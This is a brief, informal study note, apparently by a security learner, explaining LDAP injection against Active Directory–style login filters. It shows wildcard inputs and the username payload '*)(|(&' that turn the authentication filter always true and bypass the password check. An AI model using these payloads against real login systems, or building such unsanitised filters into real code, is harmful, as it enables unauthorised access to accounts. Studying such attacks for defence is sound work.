# LDAP is protocol that is used in the authentication and authorization process in ADs or any domain controllers


we use alway true data to bypass authentication like sql but here we are malipulating the query itself 

we use * as a wildcard to match any user in both username and password field 

if the code is using something like 
```
(&(uid=)(userPassword=))
```
we can use * as to match any user like
```
(&(uid=a*)(userPassword=*))
```
is there is a admin user we get the admin access

if  the code is something like this 
```
(&(uid={userInput})(userPassword={passwordInput}))
```
we can inject this in the username field 
```
*)(|(&
```
This makes teh query 
```
(&(uid=*)(|(&)(userPassword=any value))
```
this makes the query be always true because the * matches every user and the empty (&) evaluates always true
